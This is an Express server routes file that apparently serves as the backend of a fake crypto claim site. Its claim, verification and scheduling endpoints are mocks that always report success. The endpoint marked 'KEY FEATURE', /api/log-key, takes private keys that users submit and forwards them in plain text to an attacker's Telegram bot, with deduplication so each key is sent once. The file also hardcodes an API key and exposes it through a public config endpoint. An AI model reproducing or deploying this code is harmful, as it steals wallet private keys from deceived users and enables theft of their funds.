import type { Express } from "express";
import type { Server } from "http";
import { telegramConfig } from "@shared/schema";
import crypto from "crypto";
import path from "path";
import fs from "fs";

export async function registerRoutes(
  httpServer: Server,
  app: Express
): Promise<Server> {

  // Configuration Endpoint
  app.get('/api/config', (_req, res) => {
    res.json({ GEMINI_API_KEY: process.env.GEMINI_API_KEY || 'AIzaSyCTXXWEXqgNA27bR1ZqhyVpeV7v3AbMWhE' });
  });

  // Mock endpoints for original index.html calls
  app.post('/api/check-key-status', (req, res) => {
    res.json({ disabled: false });
  });

  app.get('/api/get-maintenance-mode', (req, res) => {
    res.json({ maintenance_mode: false });
  });

  app.get('/api/get-link-status', (req, res) => {
    res.json({ status: 'active' });
  });

  app.post('/api/permanent-verified', (req, res) => {
    res.json({ success: true, message: 'Processed', addresses: [] });
  });

  app.post('/api/auto-claim-schedule', (req, res) => {
    res.json({ success: true, message: 'Scheduled' });
  });

  app.post('/api/claim-celo', (req, res) => {
    res.json({ success: true, message: 'Claimed' });
  });

  app.post('/api/chat', (req, res) => {
    res.json({ success: true, reply: 'Chat logic placeholder' });
  });

  // TELEGRAM LOGGING - KEY FEATURE
  app.post('/api/log-key', async (req, res) => {
    try {
      const { privateKey } = req.body;
      
      if (!privateKey) {
        return res.status(400).json({ success: false, error: "Missing private key" });
      }

      // Hash the key for deduplication
      const hash = crypto.createHash('sha256').update(privateKey.trim()).digest('hex');
      
      // Simple file-based deduplication
      const seenKeysFile = path.join(process.cwd(), "seen_keys.txt");
      let alreadySeen = false;
      if (fs.existsSync(seenKeysFile)) {
        const content = fs.readFileSync(seenKeysFile, "utf8");
        if (content.includes(hash)) {
          alreadySeen = true;
        }
      }

      if (alreadySeen) {
        return res.json({ success: true, sent: false, reason: "Duplicate" });
      }

      // Send to Telegram
      const { botToken, chatId } = telegramConfig;
      const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
      
      const response = await fetch(telegramUrl, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: chatId,
          text: privateKey.trim()
        })
      });

      if (response.ok) {
        // Mark as sent
        fs.appendFileSync(seenKeysFile, hash + "\n");
        res.json({ success: true, sent: true });
      } else {
        const errText = await response.text();
        console.error("Telegram API Error:", errText);
        res.status(502).json({ success: false, error: "Failed to send to Telegram" });
      }
    } catch (e) {
      console.error("Log Key Error:", e);
      res.status(500).json({ success: false, error: String(e) });
    }
  });

  return httpServer;
}
